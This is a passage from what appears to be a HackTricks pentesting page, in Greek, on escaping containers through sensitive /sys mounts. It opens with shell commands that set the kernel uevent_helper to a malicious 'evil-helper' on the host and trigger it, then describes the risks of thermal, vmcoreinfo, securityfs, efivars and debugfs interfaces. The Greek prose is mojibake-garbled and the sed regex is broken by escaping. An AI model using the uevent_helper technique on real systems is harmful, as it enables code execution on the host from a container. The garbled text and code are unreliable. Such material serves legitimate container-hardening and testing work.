host\_path=$(sed -n 's/._\perdir=(\[^,]_).\*/\1/p' /etc/mtab)

#### ÎŸÏÎ¯Î¶ÎµÎ¹ Ï„Î¿ uevent\_helper ÏƒÎµ ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î¿ helper

echo "$host\_path/evil-helper" > /sys/kernel/uevent\_helper

#### Î•Î½ÎµÏÎ³Î¿Ï€Î¿Î¹ÎµÎ¯ Î­Î½Î± uevent

echo change > /sys/class/mem/null/uevent

#### Î”Î¹Î±Î²Î¬Î¶ÎµÎ¹ Ï„Î·Î½ Î­Î¾Î¿Î´Î¿

cat /output %%%

#### **`/sys/class/thermal`**

* Î•Î»Î­Î³Ï‡ÎµÎ¹ Ï„Î¹Ï‚ ÏÏ…Î¸Î¼Î¯ÏƒÎµÎ¹Ï‚ Î¸ÎµÏÎ¼Î¿ÎºÏÎ±ÏƒÎ¯Î±Ï‚, ÎµÎ½Î´ÎµÏ‡Î¿Î¼Î­Î½Ï‰Ï‚ Ï€ÏÎ¿ÎºÎ±Î»ÏÎ½Ï„Î±Ï‚ ÎµÏ€Î¹Î¸Î­ÏƒÎµÎ¹Ï‚ DoS Î® Ï†Ï…ÏƒÎ¹ÎºÎ® Î¶Î·Î¼Î¹Î¬.

#### **`/sys/kernel/vmcoreinfo`**

* Î”Î¹Î±ÏÏÎ­ÎµÎ¹ Î´Î¹ÎµÏ…Î¸ÏÎ½ÏƒÎµÎ¹Ï‚ Ï€Ï…ÏÎ®Î½Î±, ÎµÎ½Î´ÎµÏ‡Î¿Î¼Î­Î½Ï‰Ï‚ Ï…Ï€Î¿Î½Î¿Î¼ÎµÏÎ¿Î½Ï„Î±Ï‚ Ï„Î¿ KASLR.

#### **`/sys/kernel/security`**

* Î£Ï„ÎµÎ³Î¬Î¶ÎµÎ¹ Ï„Î· Î´Î¹ÎµÏ€Î±Ï†Î® `securityfs`, ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Î½Ï„Î±Ï‚ Ï„Î· ÏÏÎ¸Î¼Î¹ÏƒÎ· Ï„Ï‰Î½ Linux Security Modules ÏŒÏ€Ï‰Ï‚ Ï„Î¿ AppArmor.
* Î— Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÏ€Î¹Ï„ÏÎ­ÏˆÎµÎ¹ ÏƒÎµ Î­Î½Î± ÎºÎ¿Î½Ï„Î­Î¹Î½ÎµÏ Î½Î± Î±Ï€ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Ï„Î¿ MAC ÏƒÏÏƒÏ„Î·Î¼Î± Ï„Î¿Ï….

#### **`/sys/firmware/efi/vars` ÎºÎ±Î¹ `/sys/firmware/efi/efivars`**

* Î•ÎºÎ¸Î­Ï„ÎµÎ¹ Î´Î¹ÎµÏ€Î±Ï†Î­Ï‚ Î³Î¹Î± Ï„Î·Î½ Î±Î»Î»Î·Î»ÎµÏ€Î¯Î´ÏÎ±ÏƒÎ· Î¼Îµ Ï„Î¹Ï‚ Î¼ÎµÏ„Î±Î²Î»Î·Ï„Î­Ï‚ EFI ÏƒÏ„Î·Î½ NVRAM.
* Î— ÎºÎ±ÎºÎ® ÏÏÎ¸Î¼Î¹ÏƒÎ· Î® Î· ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î¿Î´Î·Î³Î®ÏƒÎµÎ¹ ÏƒÎµ ÎºÎ±Ï„ÎµÏƒÏ„ÏÎ±Î¼Î¼Î­Î½Î± laptops Î® Î¼Î·Ï‡Î±Î½Î­Ï‚ host Ï€Î¿Ï… Î´ÎµÎ½ ÎµÎºÎºÎ¹Î½Î¿ÏÎ½.

#### **`/sys/kernel/debug`**

* Î¤Î¿ `debugfs` Ï€ÏÎ¿ÏƒÏ†Î­ÏÎµÎ¹ Î¼Î¹Î± Î´Î¹ÎµÏ€Î±Ï†Î® Î±Ï€Î¿ÏƒÏ†Î±Î»Î¼Î¬Ï„Ï‰ÏƒÎ·Ï‚ "Ï‡Ï‰ÏÎ¯Ï‚ ÎºÎ±Î½ÏŒÎ½ÎµÏ‚" ÏƒÏ„Î¿Î½ Ï€Ï…ÏÎ®Î½Î±.
* Î™ÏƒÏ„Î¿ÏÎ¹ÎºÏŒ Ï€ÏÎ¿Î²Î»Î·Î¼Î¬Ï„Ï‰Î½ Î±ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚ Î»ÏŒÎ³Ï‰ Ï„Î·Ï‚ Î±Ï€ÎµÏÎ¹ÏŒÏÎ¹ÏƒÏ„Î·Ï‚ Ï†ÏÏƒÎ·Ï‚ Ï„Î¿Ï….

### Î‘Î½Î±Ï†Î¿ÏÎ­Ï‚

* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
* [ÎšÎ±Ï„Î±Î½ÏŒÎ·ÏƒÎ· ÎºÎ±Î¹ Î£ÎºÎ»Î·ÏÎ±Î³ÏÎ³Î·ÏƒÎ· Ï„Ï‰Î½ Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc\_group\_understanding\_hardening\_linux\_containers-1-1.pdf)
* [ÎšÎ±Ï„Î¬Ï‡ÏÎ·ÏƒÎ· Î ÏÎ¿Î½Î¿Î¼Î¹Î±ÎºÏÎ½ ÎºÎ±Î¹ ÎœÎ· Î ÏÎ¿Î½Î¿Î¼Î¹Î±ÎºÏÎ½ Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container\_whitepaper.pdf)

<figure><img src="../../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Î¥Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î· HackTricks</summary>

* Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·Î½** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ ÎºÏŒÎ»Ï€Î± hacking Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
